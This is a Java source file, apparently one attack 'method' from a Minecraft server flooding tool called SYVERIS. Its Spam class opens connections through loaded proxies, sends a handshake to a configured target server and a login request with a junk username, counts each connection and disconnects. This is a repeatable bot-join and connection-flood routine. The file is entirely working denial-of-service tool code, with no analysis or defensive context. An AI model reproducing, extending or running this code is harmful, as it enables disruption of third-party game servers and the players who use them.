package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.Handshake;
import IO.SYVERIS.utils.LoginRequest;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Spam implements Method {
   private Handshake handshake;
   private byte[] bytes;

   public Spam() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest("\n\n syveris \n\n")).getWrappedPacket()));
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
